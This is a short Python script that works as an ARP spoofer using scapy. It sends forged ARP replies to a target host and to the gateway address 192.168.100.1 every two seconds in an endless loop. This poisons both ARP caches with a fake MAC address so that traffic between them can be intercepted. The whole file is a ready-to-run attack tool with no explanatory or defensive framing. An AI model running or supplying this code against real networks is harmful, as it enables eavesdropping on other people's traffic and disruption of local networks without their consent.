#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy

def get_arguments():
    argparser = argparse.ArgumentParser(description="ARP Spoofer")
    argparser.add_argument("-t", "--target", dest="target", required=True, help="Host / IP range. (Ex: 192.168.1.1 / 192.168.1.0/21)")
    argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)")

    args = argparser.parse_args()

    return args.target, args.interface

def spoof(ip_address, spoof_ip, interface):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.sendp(arp_packet, iface=interface, verbose=False)

def main():
    target, interface = get_arguments()

    while True:
        spoof(target, "192.168.100.1", interface)
        spoof("192.168.100.1", target, interface)

        time.sleep(2)

if __name__ == "__main__":
    main()
